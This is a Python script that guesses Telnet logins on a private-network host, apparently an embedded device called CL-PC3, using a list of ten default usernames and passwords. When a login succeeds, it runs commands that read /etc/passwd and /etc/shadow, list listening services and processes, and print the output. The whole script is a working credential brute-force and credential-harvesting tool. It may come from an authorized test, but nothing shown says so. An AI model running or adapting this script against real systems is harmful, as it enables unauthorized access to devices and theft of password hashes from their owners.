#!/usr/bin/env python3
"""Telnet 23 weak-password probe for CL-PC3 (172.20.10.2).

Tries up to 10 most common buildroot/embedded passwords. Each attempt is fully
stand-alone (separate TCP connection); waits 4 seconds between attempts.

NEVER does writes. Only reads /etc/passwd /etc/shadow ps netstat if login wins.
"""
import socket, time, sys

HOST, PORT = '172.20.10.2', 23
PER_ATTEMPT_TIMEOUT = 8.0
PASSWD_LIST = [
    ('root', ''),
    ('root', 'root'),
    ('root', 'admin'),
    ('root', '1234'),
    ('root', 'password'),
    ('root', '12345678'),
    ('admin', 'admin'),
    ('admin', '1234'),
    ('buildroot', 'buildroot'),
    ('user', 'user'),
]

# Telnet IAC negotiation: respond DONT/WONT to all DO/WILL except SGA/ECHO if needed
IAC = 0xFF
DO = 0xFD; DONT = 0xFE; WILL = 0xFB; WONT = 0xFC; SB = 0xFA; SE = 0xF0

def telnet_strip(buf):
    """Strip IAC sequences from telnet stream. Return (clean_text_bytes, refusals)."""
    out = bytearray()
    refusals = bytearray()
    i = 0
    while i < len(buf):
        b = buf[i]
        if b == IAC:
            if i + 1 >= len(buf):
                break
            cmd = buf[i+1]
            if cmd == IAC:
                out.append(IAC); i += 2
            elif cmd in (DO, DONT, WILL, WONT):
                if i + 2 >= len(buf):
                    break
                opt = buf[i+2]
                # Refuse everything: WONT for DO, DONT for WILL
                if cmd == DO:
                    refusals += bytes([IAC, WONT, opt])
                elif cmd == WILL:
                    refusals += bytes([IAC, DONT, opt])
                i += 3
            elif cmd == SB:
                # subnegotiation - skip until IAC SE
                i += 2
                while i < len(buf) - 1:
                    if buf[i] == IAC and buf[i+1] == SE:
                        i += 2; break
                    i += 1
            else:
                i += 2
        else:
            out.append(b); i += 1
    return bytes(out), bytes(refusals)

def try_login(user, pwd, timeout=PER_ATTEMPT_TIMEOUT):
    """Try to log in. Return (success, transcript).
    Success if we see a shell prompt ('#' or '$' at start of line) after sending creds.
    """
    s = socket.socket()
    s.settimeout(timeout)
    transcript = []
    try:
        s.connect((HOST, PORT))
    except Exception as e:
        return False, f'connect error: {e}'

    accumulated = b''
    def read_until_pattern(timeout_s, patterns):
        nonlocal accumulated
        deadline = time.time() + timeout_s
        while time.time() < deadline:
            s.settimeout(max(0.1, deadline - time.time()))
            try:
                chunk = s.recv(2048)
            except socket.timeout:
                break
            if not chunk: break
            accumulated += chunk
            clean, refusals = telnet_strip(accumulated)
            if refusals:
                try: s.sendall(refusals)
                except: pass
                accumulated = b''  # consumed
            if any(p in clean for p in patterns):
                return clean
        clean, _ = telnet_strip(accumulated)
        return clean

    # Wait for "login:" prompt
    initial = read_until_pattern(4.0, [b'login:', b'Login:', b'username:'])
    transcript.append(f'INITIAL: {initial[:200]!r}')

    if not (b'login' in initial.lower() if initial else False):
        return False, ' | '.join(transcript) + ' (no login prompt)'

    # Send username
    s.sendall(user.encode() + b'\r\n')
    after_user = read_until_pattern(4.0, [b'assword:', b'Password:'])
    transcript.append(f'AFTER_USER: {after_user[:200]!r}')

    if not (b'assword' in after_user if after_user else False):
        # If empty password is silently accepted (no password prompt), might still get shell
        # Some devices skip the password prompt for empty pwd
        # See if we got prompt directly
        if b'#' in after_user or b'$ ' in after_user:
            return True, ' | '.join(transcript) + ' (no password prompt; got shell)'
        return False, ' | '.join(transcript) + ' (no password prompt)'

    # Send password
    s.sendall(pwd.encode() + b'\r\n')
    final = read_until_pattern(5.0, [b'#', b'$ ', b'>', b'incorrect', b'failed', b'Login incorrect', b'denied'])
    transcript.append(f'FINAL: {final[:300]!r}')

    # Detect shell
    success = False
    final_lower = final.lower() if final else b''
    if b'incorrect' not in final_lower and b'denied' not in final_lower and b'fail' not in final_lower and b'invalid' not in final_lower:
        if b'#' in final or b'$ ' in final or b'~' in final:
            success = True

    if success:
        # Run safe read commands
        for cmd in [b'whoami\r\n', b'uname -a\r\n', b'cat /etc/passwd\r\n', b'cat /etc/shadow 2>&1 | head -5\r\n', b'netstat -tlnp 2>&1 | head -10\r\n', b'ps | head -20\r\n']:
            s.sendall(cmd)
            time.sleep(1.0)
        # Drain
        s.settimeout(3.0)
        rest = b''
        try:
            while True:
                c = s.recv(4096)
                if not c: break
                rest += c
                if len(rest) > 20000: break
        except: pass
        clean, _ = telnet_strip(rest)
        transcript.append(f'CMDS_OUTPUT: {clean[:2000]!r}')

    s.close()
    return success, ' | '.join(transcript)

print(f'Telnet 23 probe -> {HOST}:{PORT}')
print(f'Trying {len(PASSWD_LIST)} credentials, 4s spacing.')
print()

hits = []
for i, (u, p) in enumerate(PASSWD_LIST):
    label = f'{u} / {p!r}'
    print(f'[{i+1}/{len(PASSWD_LIST)}] {label}')
    success, transcript = try_login(u, p)
    if success:
        print(f'  HIT: {label}')
        print(f'  Transcript: {transcript[:1500]}')
        hits.append((u, p, transcript))
        break
    else:
        excerpt = transcript[:160].replace('\\r\\n', ' ')
        print(f'  miss: {excerpt}')
    time.sleep(4.0)

print()
print(f'Hits: {len(hits)}')
if hits:
    for u, p, t in hits:
        print(f'  -> {u} / {p}')
        print(f'  Full transcript:')
        print(t)
